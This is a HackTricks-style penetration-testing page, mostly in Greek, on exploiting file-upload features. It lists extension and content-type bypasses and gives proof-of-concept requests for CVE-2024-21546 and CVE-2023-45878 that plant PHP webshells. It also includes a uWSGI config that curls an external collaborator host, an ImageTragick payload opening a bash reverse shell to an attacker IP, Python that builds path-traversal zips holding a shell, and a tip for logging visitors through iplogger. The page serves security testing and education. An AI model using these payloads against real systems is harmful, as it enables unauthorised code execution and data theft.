# Ανέβασμα Αρχείων

{{#include ../../banners/hacktricks-training.md}}

## Γενική Μεθοδολογία Ανέβασματος Αρχείων

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Εργασία σε PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. Αν εφαρμόζεται, ελέγξτε τις προηγούμενες επεκτάσεις. Δοκιμάστε τις επίσης χρησιμοποιώντας μερικά κεφαλαία γράμματα: _pHp, .pHP5, .PhAr ..._
2. _Check **adding a valid extension before** the execution extension (use previous extensions also):_
- _file.png.php_
- _file.png.Php5_
3. Προσπαθήστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος.** Μπορείτε να χρησιμοποιήσετε Burp για **bruteforce** όλων των χαρακτήρων **ascii** και **Unicode**. (_Σημείωση: μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε τις **προηγουμένως** αναφερθείσες **επεκτάσεις**_) 
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Προσπαθήστε να παρακάμψετε τους ελέγχους **ξεγελώντας τον parser των επεκτάσεων** στην πλευρά του server με τεχνικές όπως **διπλασιασμός** της **επέκτασης** ή **προσθήκη junk** δεδομένων (**null** bytes) ανάμεσα στις επεκτάσεις. _Μπορείτε επίσης να χρησιμοποιήσετε τις **προηγούμενες επεκτάσεις** για να φτιάξετε ένα καλύτερο payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Προσθέστε **ακόμα ένα επίπεδο επεκτάσεων** στον προηγούμενο έλεγχο:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Προσπαθήστε να βάλετε την **εκτελέσιμη επέκταση πριν την έγκυρη επέκταση** και ελπίζετε ότι ο server είναι λάθος ρυθμισμένος. (χρήσιμο για εκμετάλλευση misconfigurations σε Apache όπου οτιδήποτε με επέκταση **.php**, αλλά **όχι απαραίτητα τελειώνει σε .php**, θα εκτελέσει κώδικα):
- _ex: file.php.png_
7. Χρήση του **NTFS alternate data stream (ADS)** στα **Windows**. Σε αυτή την περίπτωση, θα εισαχθεί ο χαρακτήρας άνω τελείας ":" μετά από μια απαγορευμένη επέκταση και πριν από μια επιτρεπτή. Ως αποτέλεσμα, ένα **κενό αρχείο με την απαγορευμένη επέκταση** θα δημιουργηθεί στον server (π.χ. "file.asax:.jpg”). Αυτό το αρχείο μπορεί να επεξεργαστεί αργότερα χρησιμοποιώντας άλλες τεχνικές όπως η χρήση του short filename. Το μοτίβο "**::$data**” μπορεί επίσης να χρησιμοποιηθεί για να δημιουργήσει μη-κενά αρχεία. Συνεπώς, η προσθήκη ενός χαρακτήρα τελείας μετά από αυτό το μοτίβο μπορεί επίσης να είναι χρήσιμη για παράκαμψη επιπλέον περιορισμών (π.χ. "file.asp::$data.”)
8. Προσπαθήστε να σπάσετε τα όρια του ονόματος αρχείου. Η έγκυρη επέκταση κόβεται και το κακόβουλο PHP μένει. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Κάποιοι handlers ανέβασματος αφαιρούν ή κανονικοποιούν χαρακτήρες τελείας στο τέλος του ονόματος αρχείου που αποθηκεύεται. Στο UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) εκδόσεις πριν την 2.9.1, μπορείτε να παρακάμψετε τον έλεγχο επεκτάσεων ως εξής:

- Χρησιμοποιήστε ένα έγκυρο image MIME και magic header (π.χ. το PNG signature `\x89PNG\r\n\x1a\n`).
- Ονομάστε το ανεβασμένο αρχείο με επέκταση PHP ακολουθούμενη από τελεία, π.χ. `shell.php.`.
- Ο server αφαιρεί την τελική τελεία και αποθηκεύει `shell.php`, το οποίο θα εκτελεστεί εάν τοποθετηθεί σε έναν δημόσια σερβιρισμένο φάκελο (προεπιλεγμένος public storage όπως `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Στη συνέχεια, προσπελάστε την αποθηκευμένη διαδρομή (τυπική σε Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Επιβάλετε αυστηρές server-side allowlists και επαληθεύστε ξανά το persisted filename.
- Serve uploads from non-executable locations.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Βρείτε μια ευπάθεια που να επιτρέπει το **rename** του αρχείου που έχει ήδη ανέβει (για να αλλάξετε την extension).
- Find a **Local File Inclusion** vulnerability to execute the backdoor.
- **Possible Information disclosure**:
1. Ανεβάστε το **ίδιο αρχείο** **πολλές φορές** (και **ταυτόχρονα**) με το **ίδιο όνομα**
2. Ανεβάστε ένα αρχείο με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Ανέβασμα αρχείου με **"." , "..", ή "…" ως όνομά του**. Για παράδειγμα, σε Apache σε **Windows**, αν η εφαρμογή αποθηκεύει τα uploaded αρχεία στο "/www/uploads/" directory, το όνομα αρχείου "." θα δημιουργήσει ένα αρχείο called
uploads” in the "/www/" directory.
4. Ανεβάστε ένα αρχείο που ενδέχεται να μην διαγραφεί εύκολα όπως **"…:.jpg"** σε **NTFS**. (Windows)
5. Ανεβάστε ένα αρχείο σε **Windows** με **μη έγκυρους χαρακτήρες** όπως `|<>*?”` στο όνομά του. (Windows)
6. Ανεβάστε ένα αρχείο σε **Windows** χρησιμοποιώντας **reserved** (**forbidden**) **names** όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, και LPT9.
- Δοκιμάστε επίσης να **ανεβάσετε ένα executable** (.exe) ή ένα **.html** (λιγότερο ύποπτο) που **θα εκτελέσει κώδικα** όταν ανοιχτεί κατά λάθος από το θύμα.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Η εκτέλεση του payload συμβαίνει κατά το parsing του αρχείου διαμόρφωσης. Για να ενεργοποιηθεί και να αναλυθεί η διαμόρφωση, η διαδικασία uWSGI πρέπει είτε να επανεκκινήσει (πιθανώς μετά από μια κατάρρευση ή λόγω ενός Denial of Service attack) είτε το αρχείο να ρυθμιστεί σε auto-reload. Η δυνατότητα auto-reload, αν είναι ενεργοποιημένη, επαναφορτώνει το αρχείο σε καθορισμένα διαστήματα όταν εντοπίζει αλλαγές.

Είναι κρίσιμο να κατανοηθεί η χαλαρή φύση του parsing των αρχείων διαμόρφωσης του uWSGI. Συγκεκριμένα, το προαναφερθέν payload μπορεί να εισαχθεί σε ένα binary file (όπως ένα image ή PDF), διευρύνοντας περαιτέρω το πεδίο πιθανής εκμετάλλευσης.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint στο Gibbon LMS επιτρέπει arbitrary file write μέσα στο web root, οδηγώντας σε pre-auth RCE με την τοποθέτηση ενός PHP αρχείου. Ευάλωτες εκδόσεις: έως και 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Αποθέστε ένα ελάχιστο webshell και εκτελέστε commands:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Σημειώσεις:
- Ο handler εκτελεί `base64_decode($_POST["img"])` μετά το split με `;` και `,`, και στη συνέχεια γράφει bytes στο `$absolutePath . '/' . $_POST['path']` χωρίς να ελέγχει extension/type.
- Ο προκύπτων κώδικας τρέχει ως ο χρήστης της web υπηρεσίας (π.χ., XAMPP Apache σε Windows).

Αναφορές για αυτό το bug περιλαμβάνουν το usd HeroLab advisory και την NVD entry. Δείτε την ενότητα References παρακάτω.

## **wget File Upload/SSRF Trick**

Σε κάποιες περιπτώσεις μπορεί να βρείτε ότι ένας server χρησιμοποιεί **`wget`** για να **download files** και μπορείτε να **indicate** το **URL**. Σε αυτές τις περιπτώσεις, ο κώδικας μπορεί να ελέγχει ότι το extension των κατεβαζόμενων αρχείων βρίσκεται σε μια whitelist για να διασφαλίσει ότι θα κατέβουν μόνο επιτρεπτά αρχεία. Ωστόσο, **this check can be bypassed.**\
Το **maximum** μήκος ενός **filename** σε **linux** είναι **255**, ωστόσο, **wget** περικόπτει τα filenames σε **236** χαρακτήρες. Μπορείτε να **download a file called "A"*232+".php"+".gif"**, αυτό το filename θα **bypass** τον **check** (όπως σε αυτό το παράδειγμα **".gif"** είναι ένα **valid** extension) αλλά `wget` θα **rename** το αρχείο σε **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Σημειώστε ότι **άλλη επιλογή** που ίσως σκέφτεστε για να παρακάμψετε αυτόν τον έλεγχο είναι να κάνετε τον **HTTP server να ανακατευθύνει σε διαφορετικό αρχείο**, έτσι το αρχικό URL θα παρακάμψει τον έλεγχο και στη συνέχεια το wget θα κατεβάσει το ανακατευθυνόμενο αρχείο με το νέο όνομα. Αυτό **δεν θα λειτουργήσει** **εκτός αν** το wget χρησιμοποιείται με την **παράμετρο** `--trust-server-names` επειδή **το wget θα κατεβάσει τη σελίδα στην οποία έγινε ανακατεύθυνση με το όνομα του αρχείου που αναφέρεται στο αρχικό URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Κάποιοι legacy upload handlers που χρησιμοποιούν τη `snprintf()` ή παρόμοιες για να φτιάξουν multi-file arrays από ένα single-file upload μπορούν να ξεγελαστούν και να πλαστογραφήσουν τη δομή `_FILES`. Λόγω ασυνεπειών και truncation στη συμπεριφορά της `snprintf()`, ένα προσεκτικά κατασκευασμένο single upload μπορεί να εμφανιστεί σαν πολλαπλά indexed files από την πλευρά του server, μπερδεύοντας λογική που υποθέτει ένα συγκεκριμένο σχήμα (π.χ., θεωρώντας το ως multi-file upload και παίρνοντας unsafe branches). Αν και πιο niche σήμερα, αυτό το pattern “index corruption” περιστασιακά επανεμφανίζεται σε CTFs και παλαιότερες βάσεις κώδικα.

## Από το File upload σε άλλες ευπάθειες

- Θέστε το **filename** σε `../../../tmp/lol.png` και προσπαθήστε να επιτύχετε **path traversal**
- Θέστε το **filename** σε `sleep(10)-- -.jpg` και ίσως να μπορέσετε να επιτύχετε **SQL injection**
- Θέστε το **filename** σε `<svg onload=alert(document.domain)>` για να επιτύχετε **XSS**
- Θέστε το **filename** σε `; sleep 10;` για να δοκιμάσετε κάποια **command injection** (περισσότερα [command injections tricks εδώ](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Δοκιμάστε **διαφορετικά svg payloads** από [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Αν μπορείτε να **δηλώσετε στον web server να πιάσει μια εικόνα από ένα URL** μπορείτε να δοκιμάσετε να καταχραστείτε ένα [SSRF](../ssrf-server-side-request-forgery/index.html). Αν αυτή η **image** πρόκειται να **αποθηκευτεί** σε κάποιο **public** site, μπορείτε επίσης να υποδείξετε ένα URL από [https://iplogger.org/invisible/] και να **κλέψετε πληροφορίες από κάθε επισκέπτη**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Ειδικά σχεδιασμένα PDFs για XSS: Η [παρακάτω σελίδα δείχνει πώς να **inject PDF data για να αποκτήσετε JS execution**](../xss-cross-site-scripting/pdf-injection.md). Αν μπορείτε να ανεβάσετε PDFs μπορείτε να προετοιμάσετε ένα PDF που θα εκτελέσει arbitrary JS ακολουθώντας τις δοσμένες οδηγίες.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Ελέγξτε αν υπάρχει οποιοδήποτε **size limit** κατά το uploading αρχείων

Εδώ είναι μια top 10 λίστα από πράγματα που μπορείτε να επιτύχετε ανεβάζοντας αρχεία (από [εδώ](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Ανατρέξτε στο [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) για άλλα filetypes.

## Zip/Tar File Automatically decompressed Upload

Αν μπορείτε να ανεβάσετε ένα ZIP που πρόκειται να αποσυμπιεστεί μέσα στον server, μπορείτε να κάνετε 2 πράγματα:

### Symlink

Upload ένα link που περιέχει soft links προς άλλα αρχεία, και έπειτα, προσπελαύνοντας τα αποσυμπιεσμένα αρχεία θα έχετε πρόσβαση στα linked αρχεία:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Αποσυμπίεση σε διαφορετικούς φακέλους

Η απρόβλεπτη δημιουργία αρχείων σε καταλόγους κατά την αποσυμπίεση αποτελεί σημαντικό πρόβλημα. Παρά τις αρχικές υποθέσεις ότι αυτή η ρύθμιση μπορεί να προστατεύει από OS-level command execution μέσω κακόβουλων file uploads, η ιεραρχική υποστήριξη συμπίεσης και οι δυνατότητες directory traversal του ZIP archive format μπορούν να αξιοποιηθούν. Αυτό επιτρέπει σε επιτιθέμενους να παρακάμψουν περιορισμούς και να διαφύγουν από ασφαλείς upload directories χειριζόμενοι τη λειτουργία αποσυμπίεσης της στοχευόμενης εφαρμογής.

Ένας αυτοματοποιημένος exploit για να κατασκευάσει τέτοια αρχεία είναι διαθέσιμος στο [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Το utility μπορεί να χρησιμοποιηθεί όπως φαίνεται:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, το **symlink trick with evilarc** είναι μια επιλογή. Εάν ο στόχος είναι να στοχεύσετε ένα αρχείο όπως `/flag.txt`, πρέπει να δημιουργηθεί ένα symlink προς αυτό το αρχείο στο σύστημά σας. Αυτό διασφαλίζει ότι το evilarc δεν θα αντιμετωπίσει σφάλματα κατά τη λειτουργία του.

Παρακάτω είναι ένα παράδειγμα κώδικα Python που χρησιμοποιείται για τη δημιουργία ενός κακόβουλου αρχείου zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Κατάχρηση της συμπίεσης για file spraying**

Για περισσότερες λεπτομέρειες **ελέγξτε το αρχικό δημοσίευμα στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Δημιουργία PHP Shell**: Κώδικας PHP γράφεται για να εκτελεί εντολές που περνάνε μέσω της μεταβλητής `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying και Δημιουργία zip αρχείου**: Δημιουργούνται πολλαπλά αρχεία και συγκεντρώνεται ένα αρχείο zip που περιέχει αυτά τα αρχεία.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Τροποποίηση με Hex Editor ή vi**: Τα ονόματα των αρχείων μέσα στο zip αλλάζουν χρησιμοποιώντας vi ή έναν hex editor, αντικαθιστώντας "xxA" με "../" για να διασχίσουν καταλόγους.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Ανεβάστε αυτό το περιεχόμενο με μία επέκταση εικόνας για να εκμεταλλευτείτε την ευπάθεια **(ImageMagick , 7.0.1-1)** (από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ενσωμάτωση PHP Shell σε PNG

Η ενσωμάτωση ενός PHP shell στο IDAT chunk ενός αρχείου PNG μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` από το PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συνήθως για αλλαγή μεγέθους και resampling εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανεπηρέαστο από αυτές τις λειτουργίες αποτελεί σημαντικό πλεονέκτημα για ορισμένες περιπτώσεις χρήσης.

Μια λεπτομερής ανάλυση αυτής της τεχνικής, συμπεριλαμβανομένης της μεθοδολογίας και των πιθανών εφαρμογών, παρέχεται στο ακόλουθο άρθρο: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Αυτός ο πόρος προσφέρει μια εκτενή κατανόηση της διαδικασίας και των επιπτώσεών της.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Τα polyglot αρχεία λειτουργούν ως ένα μοναδικό εργαλείο στην κυβερνοασφάλεια, ενεργώντας ως χαμαιλέοντες που μπορούν να υπάρχουν έγκυρα σε πολλαπλές μορφές αρχείων ταυτόχρονα. Ένα ενδιαφέρον παράδειγμα είναι ένα [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένα υβρίδιο που λειτουργεί τόσο ως GIF όσο και ως RAR archive. Τέτοια αρχεία δεν περιορίζονται σε αυτό το ζεύγος· συνδυασμοί όπως GIF και JS ή PPT και JS είναι επίσης εφικτοί.

Η βασική χρησιμότητα των polyglot αρχείων έγκειται στην ικανότητά τους να παρακάμπτουν μέτρα ασφαλείας που ελέγχουν αρχεία βάσει τύπου. Συνηθισμένη πρακτική σε διάφορες εφαρμογές είναι να επιτρέπονται μόνο ορισμένοι τύποι αρχείων για upload—όπως JPEG, GIF ή DOC—για να μειωθεί ο κίνδυνος που προέρχεται από δυνητικά επικίνδυνες μορφές (π.χ. JS, PHP, ή Phar αρχεία). Ωστόσο, ένα polyglot, συμμορφούμενο με τις δομικές απαιτήσεις πολλαπλών τύπων αρχείων, μπορεί να παρακάμψει σιωπηλά αυτούς τους περιορισμούς.

